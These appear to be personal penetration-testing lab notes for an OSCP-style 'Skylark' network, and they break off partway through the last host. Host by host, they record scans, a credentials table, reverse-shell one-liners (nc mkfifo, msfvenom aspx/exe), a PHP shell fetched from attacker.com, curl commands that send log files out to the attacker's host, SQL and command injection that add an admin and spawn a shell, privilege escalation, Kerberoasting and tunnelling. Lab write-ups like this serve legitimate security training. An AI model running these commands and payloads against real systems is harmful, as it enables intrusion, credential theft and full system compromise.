
## Flags

.223 - local + proof - done
.225 - local + proof - done
Austin01 - .221 - local + proof - done 
.11 - proof
.13 - proof
Houston01 - .220  - local + proof
DC - .250  - local + proof
.226 - local + proof - done
PARIS03 - .222 - local
Sydney08 - .227 - proof
.15 - local + proof
.110 - local + proof 
.111 - local + proof 
.10 - local  + proof
.14 - local  + proof
.12 - local + proof
.31 - local + proof
.32 - proof
.30 - local + proof
.224 - local +  proof

## Creds 

| Users               | Passwords                            |
| ------------------- | ------------------------------------ |
| ftp_jp              | ~be<3@6fe1Z:2e8                      |
| j.local             | 5iQ78OU2JHAAKbQc5XAr                 |
| Hitoshi             | xsYu9XPYNu9dBfHo8L4k                 |
| ext_acc             | DoNotShare!SkyLarkLegacyInternal2008 |
| ann.sales           | B9aL9lbDOlNkGmJxusmi                 |
| Hitoshi@skylark.com | ganbatteyo!123                       |
| legacy              | I_Miss_Windows3.1                    |
| backup_service      | It4Server                            |
| skylark             | User+dcGvfwTbjV[]                    |
|                     |                                      |
223 > 225 > 221 > 226 > 224 (32, 30, 31) > 220 > 11 > 13 > 250 > 222 > 227
## 192 Networks 
250 (prep),  220, 221, 222, 223, 224, 225, 226, 227

### 220
1. Found smb creds. 
```
┌──(kali㉿kali)-[~/OSCP/labs/skylark]
└─$ netexec smb 192.168.203.220 -u user -p pass    
SMB         192.168.203.220 445    HOUSTON01        [+] SKYLARK.com\backup_service:It4Server (Pwn3d!)
```

2. Impacket-psexec login and rooted. 
```
impacket-psexec backup_service:It4Server@192.168.203.220                                
Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.203.220.....
[*] Found writable share ADMIN$
[*] Uploading file mQhqpJCF.exe
[*] Opening SVCManager on 192.168.203.220.....
[*] Creating service RYFq on 192.168.203.220.....
[*] Starting service RYFq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32> whoami
nt authority\system
```


### 221
1. Port scan
```
nmap -A -T4 -p 80,135,139,443,445,3387,5504,5985,10000,47001,49664,49665,49666,49667,49668,49671,49670,49672,49673,49674,49675,49678 192.168.161.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 10:07 EDT
Nmap scan report for 192.168.161.221
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2022-11-15T12:30:26
|_Not valid after:  2023-05-17T12:30:26
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds  Windows Server 2022 Standard 20348 microsoft-ds
3387/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5504/tcp  open  msrpc         Microsoft Windows RPC
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
10000/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-31T14:09:18+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=austin02.SKYLARK.com
| Not valid before: 2024-04-11T09:40:47
|_Not valid after:  2024-10-11T09:40:47
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-31T14:08:51
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h44m59s, deviation: 3h30m01s, median: -1s
| smb-os-discovery: 
|   OS: Windows Server 2022 Standard 20348 (Windows Server 2022 Standard 6.3)
|   Computer name: austin02
|   NetBIOS computer name: AUSTIN02\x00
|   Domain name: SKYLARK.com
|   Forest name: SKYLARK.com
|   FQDN: austin02.SKYLARK.com
|_  System time: 2024-05-31T07:08:50-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.88 seconds
```

2. Use creds from 225 machine pdf and then establish xfreerdp. 
```
http://192.168.161.221/RDWeb
“SKYLARK\kiosk” as the username and “XEwUS^9R2Gwt8O914”

xfreerdp cpub-SkylarkStatus-QuickSessionCollection-CmsRdsh.rdp  /cert-ignore /v:192.168.161.221 /u:kiosk /d:SKYLARK
```

3. Run powershell and get reverse shell. 
```
1. Click on Austin02. 
2. Search 'powershell' on search option. Open right one. 
3. Upload nc64.exe then obtain foothold on local machine. 
```

4. Port forwarding with lingolo. 
```
nc 10.10.121.254 40000

netsat -ano = shows internal network port 40000 running 

All as script, including a listener
kali - ./linproxy -selfcert, start, add listener 
client - .\agent.exe -connect 192.168.45.202:11601 -ignore-cert
kali - sudo ip route del 10.10.121.0/24 dev ligolo

listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:80
```

5. Obtained reverse shell as root. 
```
conf> write_config 123';C:\Users\kiosk\nc.exe 192.168.203.221 1235 -e cmd '123

 nc -lvnp 80            
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 40508
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

6. Post-exploitatation - Privesc to domain from local administrator. 
```
PS C:\Users\kiosk> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell

PS C:\Windows\system32whoami
whoami
nt authority\system
```

7. Kerberoast hash and carck it. 
```
PS C:\Users\kiosk> .\Rubeus.exe asreproast /nowrap

sudo hashcat -m 13100 backup_service.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force 

$krb5tgs$23$*backup_service$SKYLARK.com$AUSTIN02/backup_service.SKYLARK.com:6000@SKYLARK.com*$fe13e21f05729c3b6b9e5f99c173fc22$c9b61672045a907cec36716967692b0e39421a1842bc82739635030fd52769aeab8737fad24be9fc89ed93a4ebb14c4d53740feebd2778f955031892672934db7154b65e3a5aeebe8897c306566f68e2200ee80c77279d9ae0c92949bf3596c96ceceb9e5f3abd46ec8489742920456fd9af7222a9b6cb1bc5b7fbec09c7893669625f7573f7b21908008e17e989ac9f8c7f76372fbbcdd8af488dcae32c511f205b8993832600dd949d59ca2807ad7ab55449fe11fedc5bd33b6b879df9d6832d8c0f37aa3d60fc0ab56dfcce298d992fb5fad5b31e7d4dc651f2f78e63cb3b64b31c18aa9a1b24cb5e4627c39c8179c024cb519d5fb7a00ab8d9c4edf0617fb28da2a72ce7244e6c452ec9fdf1785e8da5eebd78c1e6bb3a917978dc4662b3e9e2e5a2c76b1e6525e305ab078b22c7ac92091b2582ed796a51d260685dcaa698a49bdf35f861e7be958dff11a77c8c434dd1ef8d6bd9048a65e62b931bef3aa2229511bd40fd0346182c063a5ec4bf4c62f8ecbb3aa1d2211cc52f8fe839cc120981094ce40a93ac91d138da4e32ebd6356cf1afe8949d867fec23337f3659d435cef068ba5d7d14bc9755a7946e6b05b630da9c1b8a2fc39468861e49f853b94ceef7f5f537785633d9d24bb441f4040e9622c2481d0f072f7e26ab70d2f224e935d904acf143709cc051a5785f611a583d02e0b1f6f5d5f002e18d30ad6251b47dbe761ccd444c4b90f5857a43fdde414117123910d038bc5a8c771dd148fc3cfda56b174bb9ceb084ff503a81b36eab15072071166eb375ae2e377a758921c70d7a7ad097706f4674b62d970820391ad8a576fdaec22f6abe8b8b14f905cada38d1918c169bf398221a9c7f148115be97549e934fd9cb94e8df5c019e1024dee87b909493e3e8266686b62c3a79cf10b94f770bf427ecef317b5cc9a4fceec639a58a4106c46ebb066ed6a98c10631fa531471d0fe2673ef379d18be9acbd84155c24663492af29cd2cac4bebfa1891ee16c5a98ad6ed360ccf351fec9f4a0d43b6b13dbf637e4421bc3ecb54c0bee6b6bcc39966bf0ba5479b61909d60ae49501012a919884a28b441ec5c048478d2d8531aeda68a2d91a60d09b5a14232467245365a441e892812746f1b55c80227c6de0ead74bd2f9e14bfec4e1f2b75d33743f697ef7813c9eece68f058e3c83445f7049527b26072d7297dcb79260bf627fdbadf83ceaff96e611903c928bb832b92a7c655a16698127b3395f84bbab773a44cf39a4eaadf230c6125edbbd71ae965669657529ca2c7a00f60862f70d940dbbd93b504c80d0f5b3d13f7baa395aaedd08a899ba1181c5996bac784814b7e2e0d186a0d137ad89e016aa54c11b4c5a0e30c77c8e0de531e65e9159d977f778b1b8a38bbcb1193882a85e7fac8ba5684ead085ba068217c79194f07bd50c7aff8aa37f86b5958e197d373634a5ed3af5c6b8162a8f12bd4f0c5a6658de9cc2e70c1b9c08f4d501c42575eb9c46e44e47a9441bf81803a894bfb149273c60c6da73289fca428f49cdd9b3b7e4f1631625db443b6d9fcf5ae82bd37e6e45c3e07d2502af3233e7539b62bfbaaaf730493090e7be2114604d56720cc21e69500eafc62189a35a9c7c77bdbf5c:It4Server
```



### 222
1. Port scan 
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2994/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

sudo nmap -sU 192.168.160.222 -p 69     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-31 20:51 EDT
Nmap scan report for 192.168.160.222
Host is up (0.10s latency).

PORT   STATE         SERVICE
69/udp open|filtered tftp
```

2. Found resource to download file from tftp. https://attackdefense.com/challengedetailsnoauth?cid=1525. 

3. Found ftp user creds. 
```
msf6 auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 192.168.160.222
RHOSTS => 192.168.160.222
msf6 auxiliary(scanner/tftp/tftpbrute) > set DICTIONARY /usr/share/metasploit-framework/data/words/tftp.txt
DICTIONARY => /usr/share/metasploit-framework/data/wordlists/tftp.txt
msf6 auxiliary(scanner/tftp/tftpbrute) > exploit

[+] Found backup.cfg on 192.168.160.222
[+] Found sip_327.cfg on 192.168.160.222
[+] Found sip.cfg on 192.168.160.222
[+] Found sip-confg on 192.168.160.222
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/tftp/tftpbrute) > 



msf6 auxiliary(admin/tftp/tftp_transfer_util) > set RHOST 192.168.160.222RHOST => 192.168.160.222
msf6 auxiliary(admin/tftp/tftp_transfer_util) > set REMOTE_FILENAME backup.cfg
REMOTE_FILENAME => backup.cfg
msf6 auxiliary(admin/tftp/tftp_transfer_util) > set ACTION Download 
ACTION => Download
msf6 auxiliary(admin/tftp/tftp_transfer_util) > exploit
[*] Running module against 192.168.160.222

[*] Receiving 'backup.cfg' from 192.168.160.222:69 as 'backup.cfg'
[+] 192.168.160.222:69 Transferred 79 bytes in 1 blocks, download complete!
[*] 192.168.160.222:69 TFTP transfer operation complete.
[*] Saving backup.cfg as 'backup.cfg'
[*] No database connected, so not actually saving the data:
FTP credentials for umbraco web application upgrade:

ftp_jp
~be<3@6fe1Z:2e8
[*] Auxiliary module execution completed

# found at sip-config
[auth_info_0]
username=l.nguyen
userid=l.nguyen
passwd=ChangeMePlease__XMPPTest

[auth_info_1]
username=j.jameson
userid=j.jameson
passwd=ChangeMePlease__XMPPTest

[auth_info_2]
username=j.jones
userid=j.jones
passwd=ChangeMePlease__XMPPTest
```

4. Get password from DC and rooted. 
```
netexec smb 192.168.164.222 -u user -p MusingExtraCounty98 
SMB         192.168.164.222 445    PARIS03          [+] paris03\Administrator:MusingExtraCounty98 (Pwn3d!)

impacket-psexec Administrator:MusingExtraCounty98@192.168.164.222
Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.164.222.....
[*] Found writable share ADMIN$
[*] Uploading file sMuXehAK.exe
[*] Opening SVCManager on 192.168.164.222.....
[*] Creating service eTTC on 192.168.164.222.....
[*] Starting service eTTC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1311]
(c) Microsoft Corporation. All rights reserved.                             
                                                                            
C:\Windows\system32> 
```

#### 223

1. Port scan
```
PORT      STATE SERVICE VERSION
60001/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.66 seconds
```

2. Found exploit and run it. Get another better shell. Only port 80 and 443 are allowed. 
```
python3 50128.py http://192.168.161.223:60001/catalog
/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: RCE_SHELL$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.243 443 >/tmp/f
cd 
```

3. Run linpeas and found mysql creds. Login and read important files. 
```
root:7NVLVTDGJ38HM2TQ

www-data@milan:/var/www/html/froxlor$ mysql -u root -h localhost -P 3306 -p
mysql -u root -h localhost -P 3306 -p
Enter password: 7NVLVTDGJ38HM2TQ
```

4. Found flybike user password and crack it. 
```
MariaDB [froxlor]> select * from panel_customers;

$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2 

 hashcat -m 7400 flybike /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

$5$gqlmiUswzVgtRBwk$JV0RLv89CvFgXPXN4F78dUFjjicf9DfQW8jnrxrQko2:Christopher
```

5. Another internal web page at 60002 found. Port forwarding with ssh, chisel is not working because all ports are blocked by firewall apart 80 and 443. 
```
ssh -R *:60002:localhost:60002 kali@192.168.45.243
```

6. Found exploit for froxlor web server. https://www.exploit-db.com/exploits/50502

7. Login and create new admin user manually. Used froxlor password again because eploits password was not accepted. Perform manual sql injection to add new admin user. 
```
`;insert into panel_admins (loginname,password,customers_see_all,domains_see_all,caneditphpsettings,change_serversettings) values ('x','$5$Q1.Kiob5H7GwfAuZ$cs0zMc7uaEo1Xd9p.5BtDf9NW.TySbHTW/W.oRlBdB3',1,1,1,1);--
```

8. Login with new creds x:Christopher. And then follow the exploit.
```
# - Go to System Settings
# - Go to Webserver settings
# - Adjust "Webserver reload command" field to a custom command
```

```
wget http://attacker.com/shell.php -O /runme.php

└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.161.223 - - [31/May/2024 05:05:02] "GET /shell.php HTTP/1.1" 200 -
```

```
php /runme.php

sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.161.223] 56660
Linux milan 5.15.0-52-generic #58~20.04.1-Ubuntu SMP Thu Oct 13 13:09:46 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 05:10:01 up  4:12,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 224 (32, 30, 31)
1. Port scan 
```
PORT STATE SERVICE REASON
22/tcp   open  ssh    syn-ack
3128/tcp open  squid-http syn-ack
8000/tcp open  http-alt   syn-ack
```

2. Establish squid proxy (/etc/proxychains)
```
# defaults set to "tor"
#socks5  127.0.0.1 1080
http 192.168.231.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008**
```

#### 32 
3. Browser proxy with creds done. Can login with any user obtained from 222. 

4. Use pigdin to get reverse shell. First setup pidgin user.
```
Basic 
Username: j.jameson
DOmain: SKYLARK
Resources: 172.16.231.32
Password:

Proxy
Proxy type: HTTP
PORT: 3128
Username: Ext_acc
Password:
```

5. Read superdomain password
```
@call abc -o/tmp/test123 -d @/opt/openfire/logs/sipxopenfire-im.log http://192.168.45.228/abc
 nc -lvnp 80 
 superadmin password to 2008_EndlessConversation</body>
```

6. Setup the trigger by uploading payload from chat box
```
@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://192.168.45.228:800/openfire.txt -o /tmp/dummy
https://packetstormsecurity.com/files/171281/CoreDial-sipXcom-sipXopenfire-21.04-Remote-Command-Execution-Weak-Permissions.html
```

7. Setup the trigger by uploading payload from chat box. 
```
Login using superadmin domain and restart services from portal. 

proxychains nc -nvlp 44447
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
listening on [any] 4444 ...
connect to [192.168.45.228] from (UNKNOWN) [192.168.231.224] 48074
bash: no job control in this shell                                     	 
[root@pbx sipxpbx]# id                                                 	 
id                                                                     	 
uid=0(root) gid=0(root) groups=0(root)

```

8. Post-exploitation 
```
found new user for 32
tcpdump -c 10 -w

Msg: Jun  2 00:43:01 terminal root: desktop:Deskt0pTermin4L
```

#### 30
```
RDP login
proxychains xfreerdp /u:desktop /p:Deskt0pTermin4L /v:172.16.231.30:3390/d:SKYLARK.COM

Check out SUID file and root. 

Post exploitation check legacy user history. There is a cred ‘legacy:I_Miss_Windows3.1’
```

#### 31
```
Telnet to root
proxychains telnet 172.16.231.31 2323
Root:root creds
/bin/sh -i 

Another way with metasoploit - exploit(bsd/finger/morris_fingerd_bof)
Local.txt location - /usr/guest/nobody
```

### 224 continue
1. Ssh login 
```
ssh legacy@192.168.156.224
I_Miss_Windows3.1
```

2. Rooted with vim capabilities. (use py3)
```
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```




### 225
1. Port scan
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Welcome to nginx!
8090/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Found file upload page with admin:admin creds. Upload php file with pdf magic bytes. 
```
pdf magic bytes - %PDF-1.7\n

8090/backend/default/uploader.php - upload here

trigger here - 8090/backend/default/uploads/shell.php
```

3. Foothold as www-data. Run linpeas found psql password. 
```
/var/www/backend/default/config.php:$con = pg_connect("host=localhost port=5432 dbname=webapp user=postgres password=EAZT5EMULA75F8MC");
```

4. Port forward 5432 port which is for postgres. 
```
./chisel-l server -p 8081 --reverse
2024/05/31 07:51:19 server: Reverse tunnelling enabled
2024/05/31 07:51:19 server: Fingerprint Q6z3VqG7PFmeFQN6e6u5EzsnthY8spjD6dTRBic5+OA=
2024/05/31 07:51:19 server: Listening on http://0.0.0.0:8081
2024/05/31 07:52:08 server: session#1: tun: proxy#R:5432=>5432: Listening

www-data@singapore06:/tmp$ ./chisel-l client 192.168.45.243:8081 R:5432:127.0.0.1:5432
<-l client 192.168.45.243:8081 R:5432:127.0.0.1:5432
2024/05/31 07:52:06 client: Connecting to ws://192.168.45.243:8081
2024/05/31 07:52:07 client: Connected (Latency 105.929025ms)
```

5. Psql login and then run command using this site. [Informational Nuggets - Hacking and Development (pollevanhoof.be)](https://pollevanhoof.be/nuggets/SQL_injection/postgres_command_execution)  (copy-paste might give syntax error)
```
psql -h 127.0.0.1 -U postgres -d webapp
Password for user postgres: 

CREATE TABLE my_evil_table(cmd_output text);
COPY my_evil_table FROM PROGRAM ‘id’;

nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.161.225] 38452
bash: cannot set terminal process group (43911): Inappropriate ioctl for device
bash: no job control in this shell
postgres@singapore06:/var/lib/postgresql/12/main$
```

6. PE with psql SUID. 
```
sudo psql -h 127.0.0.1 -U postgres -d webapp
\?
\! /bin/sh
```

7. Post-exploitation - found useful pdf file
```
/var/www/backend/default/uploads/user-guide-rdweb.pdf
```

### 226 
1. Port scan 
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2994/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
24621/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|   GetRequest: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     What are you trying to do? Go away.
|   HTTPOptions, RTSPRequest: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     Wrong command.
|   Help: 
|     220-FileZilla Server 1.5.1
|     Please visit https://filezilla-project.org/
|     214-The following commands are recognized.
|     USER TYPE SYST SIZE RNTO RNFR RMD REST QUIT
|     HELP XMKD MLST MKD EPSV XCWD NOOP AUTH OPTS DELE
|     CDUP APPE STOR ALLO RETR PWD FEAT CLNT MFMT
|     MODE XRMD PROT ADAT ABOR XPWD MDTM LIST MLSD PBSZ
|     NLST EPRT PASS STRU PASV STAT PORT
|_    Help ok.
24680/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: &#x30DB;&#x30FC;&#x30E0; - Umbraco&#x30B5;&#x30F3;&#x30D7;&#x3...
|_http-server-header: Microsoft-IIS/10.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the folloing fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

2. Ftp login using creds 'ftp_jp:~be<3@6fe1Z:2e8'. Upload malicious aspx file and trigger it using curl. Also change host name 'skylark.jp'. 
```
1. payload - msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.243 LPORT=443 -f aspx -o shell.aspx
2. Trigger - curl http://skylark.jp:24680/shell.aspx
3. Put shell.aspx in first ftp directory
```

3. Obtained foothold and use DevService unquoted binary hijack to root. 
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.243 LPORT=443 -f exe -o r.exe 

PS C:\Skylark> iwr -uri http://192.168.45.243/r.exe -Outfile Development.exe
iwr -uri http://192.168.45.243/r.exe -Outfile Development.exe
PS C:\Skylark> ls
ls


    Directory: C:\Skylark


Mode                 LastWriteTime         Length Name                                                            
----                 -------------         ------ ----                                                            
d-----        2022/12/02     11:38                Development Binaries 01                                         
-a----        2024/05/31     18:59           7168 Development.exe                                                 


PS C:\Skylark> sc.exe start DevService
sc.exe start DevService


sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.45.243] from (UNKNOWN) [192.168.160.226] 50123
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

4. Post-exploitation 
```
Transfer passwords.kdbx in local machine. 
kali - python3 /home/kali/impacket/examples/smbserver.py -smb2support myshare .
on 226 - copy C:\Users\j_local\Desktop\Passwords.kdbx \\192.168.45.243\myshare\Passwords.kdbx


crack it and found following credentials. 

Title: j_local
Uname: j.local
 Pass: 5iQ78OU2JHAAKbQc5XAr
  URL:
Notes:

Title: TokyoBank
Uname: Hitoshi
 Pass: xsYu9XPYNu9dBfHo8L4k
  URL:
Notes:
Title: Squid Proxy

Uname: ext_acc
 Pass: DoNotShare!SkyLarkLegacyInternal2008
  URL:
Notes:

Title: ann
Uname: ann.sales
 Pass: B9aL9lbDOlNkGmJxusmi
  URL:
Notes:

Title: Email
Uname: Hitoshi@skylark.com
 Pass: ganbatteyo!123
  URL:
Notes:
```

### 227
1. Found rdp port and login and rooted. 
```
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack
3389/tcp open  ms-wbt-server syn-ack

┌──(kali㉿kali)-[~/OSCP/labs/skylark]
└─$ xfreerdp /cert-ignore /v:192.168.164.227 /u:Administrator /p:DowntownAbbey1923
```


## 10 Networks 
10, 12, 13, 14, 15, 110, 111 

Connection to internal network. 
```
In local - 
──(kali㉿kali)-[~/OSCP/labs/relia]
└─$ ./chisel-l server -p 8080 --reverse
2024/06/04 21:34:01 server: Reverse tunnelling enabled
2024/06/04 21:34:01 server: Fingerprint i/ylr6BaE4eA4Dtn2mDqb26VqBqDaYL05UEJhFVtyYQ=
2024/06/04 21:34:01 server: Listening on http://0.0.0.0:8080
2024/06/04 21:34:33 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

In 220 
PS C:\Users\Administrator\Desktop> iwr -uri http://192.168.45.194/chisel-w -Outfile chisel.exe
.\chisel.exe client 192.168.45.194:8080 R:1080:socks 
PS C:\Users\Administrator\Desktop> .\chisel.exe client 192.168.45.194:8080 R:1080:socks
2024/06/04 18:34:32 client: Connecting to ws://192.168.45.194:8080
2024/06/04 18:34:37 client: Connected (Latency 2.1558091s)


Use lingolo - no fancy just as usual and set up it. 
```

### 11
1. Smb port open and use existing creds to login. Rooted 
```
┌──(kali㉿kali)-[~/OSCP/labs/skylark]
└─$ proxychains impacket-psexec backup_service:It4Server@10.10.124.11
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
[*] Requesting shares on 10.10.124.11.....
[*] Found writable share ADMIN$
[*] Uploading file YPTRPlde.exe
[*] Opening SVCManager on 10.10.124.11.....
[*] Creating service ulsy on 10.10.124.11.....
[*] Starting service ulsy.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.124.11:445  ...  OK
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```

2. Post-exploitation. 
```
C:\backup> type file.txt
Skylark partner portal

skylark:User+dcGvfwTbjV[]
```

## 13 
```
impacket-psexec backup_service:It4Server@10.10.124.13
```

### 250 
```
 impacket-psexec backup_service:It4Server@10.10.124.250

C:\> type credentials.txt
Local Admin Passwords:

- PARIS: MusingExtraCounty98
- SYDNEY: DowntownAbbey1923

```

### 10 
1. From 220 - decrypt a credentials. 
```
1. Transfer to local machine from 220
C:\Program Files\uvnc bvba\UltraVNC> ultravnc.ini

